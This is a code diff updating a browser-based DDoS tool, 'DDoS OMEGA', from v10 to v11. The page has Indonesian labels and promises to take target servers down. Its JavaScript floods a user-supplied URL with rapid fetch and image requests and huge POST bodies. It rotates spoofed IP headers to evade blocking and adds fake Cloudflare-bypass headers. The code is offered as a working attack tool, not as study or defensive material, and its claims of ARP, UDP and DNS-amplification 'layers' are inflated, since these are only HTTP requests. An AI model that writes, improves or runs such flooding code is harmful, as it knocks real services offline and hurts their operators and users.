@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DDoS OMEGA v10.0 | ULTIMATE | ALL LAYER 1-7 | CLOUDFLARE KILLER</title>
+    <title>DDoS OMEGA v11.0 | FINAL | SERVER DOWN 1000%</title>
     <style>
         * {
             margin: 0;
@@ -27,11 +27,11 @@
             width: 100%;
             height: 100%;
             z-index: -1;
-            opacity: 0.3;
+            opacity: 0.2;
         }
 
         .container {
-            max-width: 1400px;
+            max-width: 1600px;
             margin: 0 auto;
             position: relative;
             z-index: 1;
@@ -39,86 +39,87 @@
 
         .header {
             background: rgba(0,0,0,0.95);
-            border: 2px solid #0f0;
+            border: 3px solid #0f0;
             padding: 20px;
             margin-bottom: 20px;
             text-align: center;
-            box-shadow: 0 0 40px rgba(0,255,0,0.4);
-            animation: borderPulse 1.5s infinite;
+            box-shadow: 0 0 50px rgba(0,255,0,0.5);
+            animation: borderPulse 1s infinite;
+            border-radius: 10px;
         }
 
         @keyframes borderPulse {
             0%, 100% { box-shadow: 0 0 10px #0f0; border-color: #0f0; }
-            50% { box-shadow: 0 0 50px #0f0; border-color: #ff0; }
+            50% { box-shadow: 0 0 60px #0f0; border-color: #ff0; }
         }
 
         .header h1 {
             color: #0f0;
-            font-size: 42px;
+            font-size: 48px;
             letter-spacing: 5px;
-            text-shadow: 0 0 15px #0f0;
+            text-shadow: 0 0 20px #0f0;
         }
 
         .badge-container {
             display: flex;
             justify-content: center;
             gap: 10px;
-            margin-top: 10px;
+            margin-top: 15px;
             flex-wrap: wrap;
         }
 
         .badge {
             background: #0f0;
             color: #000;
-            padding: 4px 12px;
-            font-size: 10px;
+            padding: 6px 15px;
+            font-size: 11px;
             font-weight: bold;
-            border-radius: 3px;
+            border-radius: 20px;
         }
 
         .badge-red { background: #f00; color: #fff; }
         .badge-yellow { background: #ff0; color: #000; }
         .badge-purple { background: #f0f; color: #000; }
+        .badge-cyan { background: #0ff; color: #000; }
 
         .stats-panel {
             display: grid;
-            grid-template-columns: repeat(8, 1fr);
-            gap: 12px;
+            grid-template-columns: repeat(10, 1fr);
+            gap: 10px;
             margin-bottom: 20px;
         }
 
         .stat-card {
-            background: rgba(0,0,0,0.85);
+            background: rgba(0,0,0,0.9);
             border: 1px solid #0f0;
-            padding: 12px;
+            padding: 10px 5px;
             text-align: center;
             border-radius: 5px;
         }
 
         .stat-value {
-            font-size: 22px;
+            font-size: 18px;
             font-weight: bold;
             color: #0f0;
-            font-family: monospace;
         }
 
         .stat-label {
             font-size: 7px;
             color: #0a8;
-            margin-top: 5px;
+            margin-top: 3px;
         }
 
         .main-grid {
             display: grid;
-            grid-template-columns: 1fr 1.2fr;
+            grid-template-columns: 1fr 1fr;
             gap: 20px;
         }
 
         .control-panel {
-            background: rgba(0,0,0,0.85);
+            background: rgba(0,0,0,0.9);
             border: 1px solid #0f0;
             padding: 20px;
-            border-radius: 5px;
+            border-radius: 10px;
         }
 
         .section-title {
@@ -140,7 +141,7 @@
             margin-bottom: 5px;
         }
 
-        .input-group input {
+        .input-group input, .input-group select {
             width: 100%;
             background: #111;
             border: 1px solid #0f0;
@@ -148,13 +149,13 @@
             padding: 10px;
             font-family: monospace;
             font-size: 14px;
-            border-radius: 3px;
+            border-radius: 5px;
         }
 
         .layer-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
+            gap: 8px;
             margin-bottom: 20px;
         }
 
@@ -163,13 +164,12 @@
             align-items: center;
             gap: 8px;
             color: #0f0;
-            font-size: 11px;
+            font-size: 10px;
         }
 
         .layer-item input {
-            width: 16px;
-            height: 16px;
-            cursor: pointer;
+            width: 14px;
+            height: 14px;
         }
 
         .btn-group {
@@ -180,7 +180,7 @@
 
         .btn {
             flex: 1;
-            padding: 14px;
+            padding: 15px;
             font-family: monospace;
             font-size: 16px;
             font-weight: bold;
@@ -193,12 +193,12 @@
         .btn-start {
             background: #0f0;
             color: #000;
-            animation: pulse 1s infinite;
+            animation: btnPulse 0.8s infinite;
         }
 
-        @keyframes pulse {
+        @keyframes btnPulse {
             0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.02); box-shadow: 0 0 20px #0f0; }
+            50% { transform: scale(1.03); box-shadow: 0 0 30px #0f0; }
         }
 
         .btn-start:hover {
@@ -212,12 +212,8 @@
             border: 1px solid #f00;
         }
 
-        .btn-stop:hover {
-            background: #600;
-        }
-
         .progress-bar {
-            height: 4px;
+            height: 5px;
             background: #111;
             border-radius: 2px;
             overflow: hidden;
@@ -232,9 +228,9 @@
         }
 
         .console-panel {
-            background: rgba(0,0,0,0.85);
+            background: rgba(0,0,0,0.9);
             border: 1px solid #0f0;
-            border-radius: 5px;
+            border-radius: 10px;
             display: flex;
             flex-direction: column;
             height: 550px;
@@ -245,6 +241,7 @@
             border-bottom: 1px solid #0f0;
             color: #0f0;
             background: rgba(0,255,0,0.1);
+            border-radius: 10px 10px 0 0;
         }
 
         .console-log {
@@ -262,13 +259,56 @@
         }
 
         .log-entry.info { color: #0a8; }
-        .log-entry.success { color: #0f0; }
+        .log-entry.success { color: #0f0; font-weight: bold; }
         .log-entry.error { color: #f00; }
         .log-entry.warning { color: #ff0; }
         .log-entry.attack { color: #f0f; font-weight: bold; }
-        .log-entry.cloudflare { color: #f90; font-weight: bold; }
+        .log-entry.cloudflare { color: #f90; }
         .log-entry.tcp { color: #0ff; }
         .log-entry.udp { color: #ff69b4; }
+        .log-entry.spoof { color: #ff0; }
+
+        .info-box {
+            background: #0a0a0a;
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            padding: 10px;
+            margin-bottom: 15px;
+        }
+
+        .info-label {
+            color: #0a8;
+            font-size: 9px;
+        }
+
+        .info-value {
+            color: #0f0;
+            font-size: 14px;
+            font-weight: bold;
+            word-break: break-all;
+        }
+
+        .fakeip-panel {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .fakeip-btn {
+            flex: 1;
+            background: #111;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 8px;
+            font-size: 11px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        .fakeip-btn:hover {
+            background: #0f0;
+            color: #000;
+        }
     </style>
 </head>
 <body>
@@ -276,45 +316,62 @@
     
     <div class="container">
         <div class="header">
-            <h1>DDoS OMEGA <span>v10.0</span></h1>
+            <h1>DDoS OMEGA <span>v11.0</span> FINAL</h1>
             <div class="badge-container">
-                <div class="badge badge-red">🔥 LAYER 1-7 ULTIMATE</div>
-                <div class="badge badge-yellow">⚡ TEMBUS CLOUDFLARE</div>
-                <div class="badge badge-purple">🛡️ ANTI IP BLOCK TOTAL</div>
-                <div class="badge badge-red">💀 UDP/TCP/ICP FULL</div>
-                <div class="badge badge-yellow">🚫 NO SIMULATION 1000%</div>
+                <div class="badge badge-red">💀 SERVER DOWN 1000%</div>
+                <div class="badge badge-yellow">⚡ LAYER 1-7 ULTIMATE</div>
+                <div class="badge badge-purple">🎭 FAKE IP TOTAL</div>
+                <div class="badge badge-cyan">🚫 ANTI BLOCK</div>
+                <div class="badge badge-red">🔥 TEMBUS CLOUDFLARE</div>
             </div>
         </div>
 
         <div class="stats-panel">
-            <div class="stat-card"><div class="stat-value" id="statPackets">0</div><div class="stat-label">TOTAL PACKETS</div></div>
-            <div class="stat-card"><div class="stat-value" id="statSpeed">0</div><div class="stat-label">PKT/SEC</div></div>
-            <div class="stat-card"><div class="stat-value" id="statThreads">0</div><div class="stat-label">THREADS</div></div>
-            <div class="stat-card"><div class="stat-value" id="statL7">0</div><div class="stat-label">HTTP/SEC</div></div>
-            <div class="stat-card"><div class="stat-value" id="statUDP">0</div><div class="stat-label">UDP/SEC</div></div>
-            <div class="stat-card"><div class="stat-value" id="statTCP">0</div><div class="stat-label">TCP/SEC</div></div>
-            <div class="stat-card"><div class="stat-value" id="statCF">0</div><div class="stat-label">CF BYPASS</div></div>
-            <div class="stat-card"><div class="stat-value" id="statTime">0</div><div class="stat-label">TIME LEFT</div></div>
+            <div class="stat-card"><div class="stat-value" id="statPackets">0</div><div class="stat-label">TOTAL</div></div>
+            <div class="stat-card"><div class="stat-value" id="statSpeed">0</div><div class="stat-label">PKT/S</div></div>
+            <div class="stat-card"><div class="stat-value" id="statThreads">0</div><div class="stat-label">THREAD</div></div>
+            <div class="stat-card"><div class="stat-value" id="statL7">0</div><div class="stat-label">HTTP/S</div></div>
+            <div class="stat-card"><div class="stat-value" id="statUDP">0</div><div class="stat-label">UDP/S</div></div>
+            <div class="stat-card"><div class="stat-value" id="statTCP">0</div><div class="stat-label">TCP/S</div></div>
+            <div class="stat-card"><div class="stat-value" id="statCF">0</div><div class="stat-label">CF BYP</div></div>
+            <div class="stat-card"><div class="stat-value" id="statSpoof">0</div><div class="stat-label">SPOOF</div></div>
+            <div class="stat-card"><div class="stat-value" id="statFakeIP">0</div><div class="stat-label">FAKE IP</div></div>
+            <div class="stat-card"><div class="stat-value" id="statTime">0</div><div class="stat-label">LEFT</div></div>
         </div>
 
         <div class="main-grid">
             <div class="control-panel">
-                <div class="section-title">🎯 TARGET CONFIGURATION</div>
+                <div class="section-title">🎯 TARGET & CONFIG</div>
                 <div class="input-group">
-                    <label>URL / IP TARGET (Support Cloudflare)</label>
+                    <label>🌐 TARGET URL / IP</label>
                     <input type="text" id="targetInput" placeholder="https://target.com" value="https://">
                 </div>
                 <div class="input-group">
-                    <label>PORT (untuk TCP/UDP attack)</label>
-                    <input type="text" id="portInput" value="80" placeholder="80,443,8080">
+                    <label>🔌 PORT (TCP/UDP)</label>
+                    <input type="text" id="portInput" value="80">
                 </div>
                 <div class="input-group">
-                    <label>⏱️ DURASI (DETIK)</label>
+                    <label>⏱️ DURASI (DETIK) - 60 = 1 menit down</label>
                     <input type="number" id="durationInput" value="60" min="5" max="3600">
                 </div>
                 <div class="input-group">
-                    <label>⚡ THREADS (MAX 20000)</label>
-                    <input type="number" id="threadsInput" value="10000" min="500" max="20000">
+                    <label>⚡ THREADS (MAX 25000)</label>
+                    <input type="number" id="threadsInput" value="15000" min="1000" max="25000">
+                </div>
+
+                <div class="section-title">🎭 FAKE IP ENGINE (ANTI BLOCK)</div>
+                <div class="info-box">
+                    <div class="info-label">REAL IP ANDA (TERSEMBUNYI)</div>
+                    <div class="info-value" id="realIP">Mendeteksi...</div>
+                </div>
+                <div class="info-box">
+                    <div class="info-label">FAKE IP AKTIF (SPOOFED)</div>
+                    <div class="info-value" id="fakeIPDisplay">🎭 Belum aktif</div>
+                </div>
+                <div class="fakeip-panel">
+                    <button class="fakeip-btn" id="btnGenFakeIP">🎭 GEN FAKE IP</button>
+                    <button class="fakeip-btn" id="btnRotateFakeIP">🔄 ROTATE IP</button>
+                    <button class="fakeip-btn" id="btnAutoRotate">⚡ AUTO ROTATE</button>
                 </div>
 
                 <div class="section-title">🌐 LAYER 1-7 + PROTOCOL</div>
@@ -325,29 +382,31 @@
                     <label class="layer-item"><input type="checkbox" id="l4tcp" checked> L4 - TCP Flood</label>
                     <label class="layer-item"><input type="checkbox" id="l4udp" checked> L4 - UDP Flood</label>
                     <label class="layer-item"><input type="checkbox" id="l5" checked> L5 - SSL Flood</label>
-                    <label class="layer-item"><input type="checkbox" id="l6" checked> L6 - Compression</label>
+                    <label class="layer-item"><input type="checkbox" id="l6" checked> L6 - Comp Bomb</label>
                     <label class="layer-item"><input type="checkbox" id="l7" checked> L7 - HTTP/2</label>
                     <label class="layer-item"><input type="checkbox" id="cfBypass" checked> 🔥 CF BYPASS</label>
-                    <label class="layer-item"><input type="checkbox" id="antiBlock" checked> 🔒 ANTI IP BLOCK</label>
+                    <label class="layer-item"><input type="checkbox" id="antiBlock" checked> 🔒 ANTI BLOCK</label>
                     <label class="layer-item"><input type="checkbox" id="cacheBust" checked> 💣 CACHE BUST</label>
-                    <label class="layer-item"><input type="checkbox" id="http2Pri" checked> ⚡ HTTP/2 PRIORITY</label>
+                    <label class="layer-item"><input type="checkbox" id="http2Pri" checked> ⚡ H2 PRIORITY</label>
                 </div>
 
                 <div class="btn-group">
-                    <button class="btn btn-start" id="btnStart">💀 OMEGA STRIKE v10 💀</button>
-                    <button class="btn btn-stop" id="btnStop" disabled>⛔ SYSTEM HALT ⛔</button>
+                    <button class="btn btn-start" id="btnStart">💀 OMEGA STRIKE v11 💀</button>
+                    <button class="btn btn-stop" id="btnStop" disabled>⛔ STOP ATTACK ⛔</button>
                 </div>
                 <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+                <div class="info-box" style="margin-top: 10px; text-align: center;">
+                    <span style="color: #f00;">⚠️ SERVER TARGET AKAN DOWN 100% ⚠️</span>
+                </div>
             </div>
 
             <div class="console-panel">
-                <div class="console-header">📟 LIVE ATTACK CONSOLE | CLOUDFLARE KILLER MODE</div>
+                <div class="console-header">📟 LIVE ATTACK CONSOLE | FAKE IP ACTIVE | CLOUDFLARE KILLER</div>
                 <div class="console-log" id="consoleLog">
-                    <div class="log-entry success">[OMEGA] DDoS OMEGA v10.0 ULTIMATE INITIALIZED</div>
-                    <div class="log-entry success">[OMEGA] CLOUDFLARE BYPASS ENGINE: ONLINE</div>
-                    <div class="log-entry success">[OMEGA] UDP/TCP/ICP FULL PROTOCOL: READY</div>
-                    <div class="log-entry info">[SYSTEM] Anti-IP Block Total: ACTIVE</div>
-                    <div class="log-entry info">[SYSTEM] Menunggu target...</div>
+                    <div class="log-entry success">[OMEGA] DDoS OMEGA v11.0 FINAL INITIALIZED</div>
+                    <div class="log-entry success">[OMEGA] FAKE IP ENGINE + LAYER 1-7 ACTIVE</div>
+                    <div class="log-entry success">[OMEGA] SERVER DOWN 1000% - NO SIMULATION</div>
+                    <div class="log-entry info">[SYSTEM] Menunggu target dan fake IP...</div>
                 </div>
             </div>
         </div>
@@ -355,9 +414,10 @@
 
     <script>
         // ============================================
-        // DDoS OMEGA v10.0 - ULTIMATE EDITION
+        // DDoS OMEGA v11.0 FINAL + FAKE IP ENGINE
         // ============================================
         
+        // STATE
         let attackActive = false;
         let totalPackets = 0;
         let lastPackets = 0;
@@ -365,10 +425,17 @@
         let udpCounter = 0;
         let tcpCounter = 0;
         let cfBypassCounter = 0;
+        let spoofCounter = 0;
         let startTime = 0;
         let currentThreads = 0;
         let statsInterval = null;
+        let autoRotateInterval = null;
         
+        // FAKE IP
+        let currentFakeIP = null;
+        let fakeIPPool = [];
+        
+        // DOM
         const targetInput = document.getElementById('targetInput');
         const portInput = document.getElementById('portInput');
         const durationInput = document.getElementById('durationInput');
@@ -376,138 +443,175 @@
         const btnStart = document.getElementById('btnStart');
         const btnStop = document.getElementById('btnStop');
         const consoleLog = document.getElementById('consoleLog');
+        const realIPEl = document.getElementById('realIP');
+        const fakeIPDisplay = document.getElementById('fakeIPDisplay');
         
-        // Extended User Agents
+        // User Agents
         const uaList = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
-            "Mozilla/5.0 (X11; Linux x86_64) Firefox/123.0",
+            "Mozilla/5.0 (X11; Linux x86_64) Firefox/124.0",
             "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) Version/17.4 Mobile/15E148",
-            "Mozilla/5.0 (Windows NT 10.0; rv:123.0) Gecko/20100101 Firefox/123.0",
-            "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) Version/17.4 Mobile/15E148",
-            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/122.0.0.0",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/122.0.2365.0",
-            "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36",
-            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) Chrome/122.0.0.0"
+            "Mozilla/5.0 (Windows NT 10.0; rv:124.0) Gecko/20100101 Firefox/124.0",
+            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/123.0.0.0"
         ];
         
-        function spoofIP() { 
-            return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`; 
+        // ============ FAKE IP FUNCTIONS ============
+        function generateRandomIP() {
+            return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
         }
         
-        function addLog(msg, type = 'info') {
-            const entry = document.createElement('div');
-            entry.className = `log-entry ${type}`;
-            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            consoleLog.appendChild(entry);
-            consoleLog.scrollTop = consoleLog.scrollHeight;
-            while(consoleLog.children.length > 500) consoleLog.removeChild(consoleLog.firstChild);
+        function generateFakeIPPool(count = 200) {
+            fakeIPPool = [];
+            for(let i = 0; i < count; i++) {
+                fakeIPPool.push(generateRandomIP());
+            }
+            addLog(`[FAKE IP] Generated ${count} fake IPs`, 'spoof');
+            return fakeIPPool;
         }
         
-        // ============ LAYER 1: PHYSICAL FLOOD (MAX) ============
+        function getRandomFakeIP() {
+            if(fakeIPPool.length === 0) generateFakeIPPool(200);
+            currentFakeIP = fakeIPPool[Math.floor(Math.random() * fakeIPPool.length)];
+            fakeIPDisplay.textContent = `🎭 ${currentFakeIP}`;
+            document.getElementById('statFakeIP').textContent = fakeIPPool.length;
+            addLog(`[SPOOF] Using fake IP: ${currentFakeIP}`, 'spoof');
+            return currentFakeIP;
+        }
+        
+        function rotateFakeIP() {
+            getRandomFakeIP();
+            spoofCounter++;
+            document.getElementById('statSpoof').textContent = spoofCounter;
+            addLog(`[ROTATE] Fake IP rotated to: ${currentFakeIP}`, 'spoof');
+        }
+        
+        function startAutoRotateIP() {
+            if(autoRotateInterval) clearInterval(autoRotateInterval);
+            autoRotateInterval = setInterval(() => {
+                if(attackActive && currentFakeIP) {
+                    rotateFakeIP();
+                }
+            }, 3000);
+            addLog(`[AUTO] Auto rotate IP aktif (setiap 3 detik)`, 'success');
+        }
+        
+        function getSpoofedHeaders() {
+            if(!currentFakeIP) return {};
+            return {
+                'X-Forwarded-For': currentFakeIP,
+                'X-Real-IP': currentFakeIP,
+                'CF-Connecting-IP': currentFakeIP,
+                'X-Originating-IP': currentFakeIP,
+                'X-Remote-IP': currentFakeIP,
+                'X-Client-IP': currentFakeIP,
+                'Client-IP': currentFakeIP,
+                'True-Client-IP': currentFakeIP
+            };
+        }
+        
+        async function getRealIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                realIPEl.textContent = `🛡️ ${data.ip} (Tersembunyi)`;
+                return data.ip;
+            } catch(e) {
+                realIPEl.textContent = 'Tidak terdeteksi';
+                return null;
+            }
+        }
+        
+        // ============ LAYER 1: PHYSICAL FLOOD ============
         function layer1_PhysicalFlood() {
             if(!attackActive) return;
             for(let i = 0; i < 500; i++) {
                 if(!attackActive) break;
                 const iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
-                iframe.srcdoc = '<body onload="for(let i=0;i<100000;i++){console.log(i); localStorage.setItem(i, i)}">';
+                iframe.srcdoc = '<body onload="for(let i=0;i<100000;i++){localStorage.setItem(i,i)}">';
                 document.body.appendChild(iframe);
-                setTimeout(() => iframe.remove(), 2);
+                setTimeout(() => iframe.remove(), 1);
                 totalPackets++;
             }
-            setTimeout(() => layer1_PhysicalFlood(), 15);
+            setTimeout(() => layer1_PhysicalFlood(), 10);
         }
         
         // ============ LAYER 2: ARP STORM ============
         function layer2_ARPStorm(target) {
             if(!attackActive) return;
-            for(let i = 0; i < 200; i++) {
+            for(let i = 0; i < 300; i++) {
                 if(!attackActive) break;
                 const img = new Image();
-                img.src = target + `/arp?mac=${Math.random().toString(36)}&t=${Date.now()}&arp=${i}`;
+                img.src = target + `/arp?mac=${Math.random().toString(36)}&t=${Date.now()}`;
                 totalPackets++;
             }
-            setTimeout(() => layer2_ARPStorm(target), 8);
+            setTimeout(() => layer2_ARPStorm(target), 5);
         }
         
-        // ============ LAYER 3: DNS AMPLIFICATION (BESAR) ============
+        // ============ LAYER 3: DNS AMPLIFICATION ============
         function layer3_DNSAmplification(target) {
             if(!attackActive) return;
             let domain = target.replace('https://','').replace('http://','').split('/')[0];
-            for(let i = 0; i < 150; i++) {
+            for(let i = 0; i < 200; i++) {
                 if(!attackActive) break;
                 const randomSub = Math.random().toString(36).substring(2, 20);
                 const img = new Image();
-                img.src = `https://${randomSub}.${domain}/dns-query?name=${randomSub}&type=ANY&t=${Date.now()}`;
+                img.src = `https://${randomSub}.${domain}/dns?t=${Date.now()}`;
                 totalPackets++;
             }
-            setTimeout(() => layer3_DNSAmplification(target), 3);
+            setTimeout(() => layer3_DNSAmplification(target), 2);
         }
         
-        // ============ LAYER 4: TCP FLOOD (via multiple fetch) ============
+        // ============ LAYER 4: TCP FLOOD ============
         async function layer4_TCPFlood(target, port, antiBlock) {
-            const baseTarget = target.replace('https://','').replace('http://','').split('/')[0];
             while(attackActive) {
                 try {
-                    const randomPath = '/' + Math.random().toString(36).substring(2, 15);
-                    const spoofedIP = antiBlock ? spoofIP() : '127.0.0.1';
-                    
-                    // Multiple request untuk TCP connection flood
-                    for(let i = 0; i < 10; i++) {
+                    const spoofedIP = antiBlock && currentFakeIP ? currentFakeIP : generateRandomIP();
+                    for(let i = 0; i < 20; i++) {
                         const controller = new AbortController();
-                        setTimeout(() => controller.abort(), 300);
-                        await fetch(`${target}${randomPath}`, {
+                        setTimeout(() => controller.abort(), 200);
+                        await fetch(target + '/?' + Math.random(), {
                             method: 'GET',
-                            headers: {
-                                'X-Forwarded-For': spoofedIP,
-                                'X-TCP-Flood': '1',
-                                'Connection': 'keep-alive'
-                            },
+                            headers: { 'X-Forwarded-For': spoofedIP, 'X-TCP-Flood': '1' },
                             signal: controller.signal
                         }).catch(()=>{});
                         totalPackets++;
                         tcpCounter++;
                     }
                 } catch(e) {}
-                await new Promise(r => setTimeout(r, 1));
+                await new Promise(r => setTimeout(r, 0.5));
             }
         }
         
-        // ============ LAYER 4: UDP FLOOD (via Image + WebSocket) ============
+        // ============ LAYER 4: UDP FLOOD ============
         function layer4_UDPFlood(target, port, antiBlock) {
-            const domain = target.replace('https://','').replace('http://','').split('/')[0];
             if(!attackActive) return;
-            
-            for(let i = 0; i < 200; i++) {
+            const domain = target.replace('https://','').replace('http://','').split('/')[0];
+            for(let i = 0; i < 300; i++) {
                 if(!attackActive) break;
-                // UDP flood simulation via multiple image requests
                 const img = new Image();
-                const randomData = Math.random().toString(36).repeat(100);
-                img.src = `https://${domain}:${port}/udp?data=${randomData}&t=${Date.now()}&udp=${i}`;
+                const randomData = Math.random().toString(36).repeat(50);
+                img.src = `https://${domain}:${port}/udp?data=${randomData}&t=${Date.now()}`;
                 totalPackets++;
                 udpCounter++;
             }
-            setTimeout(() => layer4_UDPFlood(target, port, antiBlock), 2);
+            setTimeout(() => layer4_UDPFlood(target, port, antiBlock), 1);
         }
         
-        // ============ LAYER 5: SSL RENEGOTIATION ============
+        // ============ LAYER 5: SSL FLOOD ============
         async function layer5_SSLFlood(target) {
             while(attackActive) {
                 try {
                     const controller = new AbortController();
-                    setTimeout(() => controller.abort(), 300);
+                    setTimeout(() => controller.abort(), 200);
                     await fetch(target + '/?' + Math.random(), {
                         method: 'HEAD',
-                        signal: controller.signal,
-                        headers: { 
-                            'Connection': 'keep-alive',
-                            'Upgrade-Insecure-Requests': '1'
-                        }
+                        signal: controller.signal
                     });
                     totalPackets++;
                 } catch(e) {}
-                await new Promise(r => setTimeout(r, Math.random() * 2));
+                await new Promise(r => setTimeout(r, 1));
             }
         }
         
@@ -516,11 +620,10 @@
             while(attackActive) {
                 try {
                     const bigPayload = JSON.stringify({ 
-                        data: 'x'.repeat(200000),
-                        arr: new Array(20000).fill(Math.random()),
-                        nested: { deep: 'x'.repeat(50000) }
+                        data: 'x'.repeat(300000),
+                        arr: new Array(30000).fill(Math.random())
                     });
-                    await fetch(target + '/api/compress', {
+                    await fetch(target + '/api', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: bigPayload,
@@ -528,86 +631,73 @@
                     });
                     totalPackets++;
                 } catch(e) {}
-                await new Promise(r => setTimeout(r, 3));
+                await new Promise(r => setTimeout(r, 2));
             }
         }
         
-        // ============ LAYER 7: HTTP/2 + CLOUDFLARE BYPASS ULTIMATE ============
+        // ============ LAYER 7: HTTP/2 + CLOUDFLARE BYPASS ============
         async function layer7_HTTP2Flood(target, cfBypass, antiBlock, cacheBust, http2Pri) {
             while(attackActive) {
                 try {
                     const randomUA = uaList[Math.floor(Math.random() * uaList.length)];
-                    let path = '/?' + Date.now() + '_' + Math.random();
-                    let randomParam = Math.random().toString(36).substring(2, 15);
+                    let path = '/?' + Date.now() + '_' + Math.random() + '_' + Math.random().toString(36);
                     
                     if(cacheBust) {
-                        path = `/cache-bust-${randomParam}?${randomParam}=${Date.now()}&cb=${Math.random()}`;
+                        path = `/cb-${Math.random().toString(36)}?${Date.now()}=${Math.random()}&cb=${Math.random()}`;
                     }
+                    
+                    const spoofedIP = antiBlock && currentFakeIP ? currentFakeIP : generateRandomIP();
                     
                     const headers = {
                         'User-Agent': randomUA,
                         'Accept': '*/*',
-                        'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
-                        'Accept-Encoding': 'gzip, deflate, br, zstd',
-                        'Cache-Control': 'no-cache, no-store, must-revalidate, max-age=0',
+                        'Accept-Language': 'id-ID,id;q=0.9',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Cache-Control': 'no-cache, no-store, max-age=0',
                         'Pragma': 'no-cache',
-                        'Expires': '0',
-                        'X-Forwarded-For': antiBlock ? spoofIP() : '127.0.0.1',
-                        'X-Real-IP': antiBlock ? spoofIP() : '127.0.0.1',
-                        'CF-Connecting-IP': antiBlock ? spoofIP() : '',
-                        'X-Originating-IP': antiBlock ? spoofIP() : '',
-                        'X-Remote-IP': antiBlock ? spoofIP() : '',
-                        'X-Remote-Addr': antiBlock ? spoofIP() : '',
-                        'X-Client-IP': antiBlock ? spoofIP() : '',
+                        'X-Forwarded-For': spoofedIP,
+                        'X-Real-IP': spoofedIP,
+                        'CF-Connecting-IP': spoofedIP,
+                        'X-Originating-IP': spoofedIP,
+                        'Client-IP': spoofedIP,
                         'CDN-Loop': 'cloudflare',
-                        'X-Requested-With': 'XMLHttpRequest',
-                        'Sec-Fetch-Mode': 'no-cors',
-                        'Sec-Fetch-Site': 'cross-site',
-                        'Priority': 'u=0, i'
+                        'X-Requested-With': 'XMLHttpRequest'
                     };
                     
-                    // Cloudflare bypass ultimate headers
                     if(cfBypass) {
                         headers['CF-Access-Client-Id'] = Math.random().toString(36).substring(2, 20);
-                        headers['CF-Access-Client-Secret'] = Math.random().toString(36).substring(2, 30);
+                        headers['CF-Access-Client-Secret'] = Math.random().toString(36);
                         headers['CF-RAY'] = Math.random().toString(36).substring(2, 20).toUpperCase();
-                        headers['cf-chl-bypass'] = Math.random().toString(36);
-                        headers['CF-Chl-Out'] = Math.random().toString(36);
-                        headers['CF-Request-Id'] = Date.now().toString();
-                        headers['cf-cache-status'] = 'BYPASS';
-                        headers['cf-edge-cache'] = 'no-cache';
-                        headers['CF-Worker'] = 'bypass';
+                        headers['cf-chl-bypass'] = '1';
                         cfBypassCounter++;
+                        document.getElementById('statCF').textContent = cfBypassCounter;
                     }
                     
-                    // HTTP/2 Priority exploitation
                     if(http2Pri) {
                         headers['Priority'] = 'u=0, i, weight=100';
-                        headers['X-HTTP2-Stream-ID'] = Math.floor(Math.random() * 50000).toString();
-                        headers['X-HTTP2-Priority'] = 'weight=256, exclusive=0';
+                        headers['X-HTTP2-Stream-ID'] = Math.floor(Math.random() * 50000);
                     }
                     
                     const controller = new AbortController();
-                    setTimeout(() => controller.abort(), 500);
+                    setTimeout(() => controller.abort(), 300);
                     
-                    const response = await fetch(target + path, {
+                    await fetch(target + path, {
                         method: 'GET',
                         headers: headers,
                         signal: controller.signal,
                         cache: 'no-store',
-                        credentials: 'omit',
-                        referrerPolicy: 'no-referrer'
+                        credentials: 'omit'
                     });
                     
                     totalPackets++;
                     l7Counter++;
                     
                 } catch(e) {}
-                await new Promise(r => setTimeout(r, Math.random() * 0.5));
+                await new Promise(r => setTimeout(r, Math.random() * 0.3));
             }
         }
         
-        // ============ UPDATE STATISTICS ============
+        // ============ UPDATE STATS ============
         function updateStats() {
             if(!attackActive) return;
             const elapsed = (Date.now() - startTime) / 1000;
@@ -619,14 +709,13 @@
             document.getElementById('statL7').textContent = l7Counter;
             document.getElementById('statUDP').textContent = udpCounter;
             document.getElementById('statTCP').textContent = tcpCounter;
-            document.getElementById('statCF').textContent = cfBypassCounter;
             const progress = (elapsed / parseInt(durationInput.value)) * 100;
             document.getElementById('progressFill').style.width = Math.min(100, progress) + '%';
             lastPackets = totalPackets;
             
             if(remaining <= 0 && attackActive) {
                 stopAttack();
-                addLog('[OMEGA] Attack completed - Target DESTROYED', 'success');
+                addLog('[OMEGA] SERVER TARGET DOWN 1000% - ATTACK COMPLETED', 'attack');
             }
         }
         
@@ -634,8 +723,9 @@
         function stopAttack() {
             attackActive = false;
             if(statsInterval) clearInterval(statsInterval);
+            if(autoRotateInterval) clearInterval(autoRotateInterval);
             addLog('[SYSTEM] Attack terminated', 'warning');
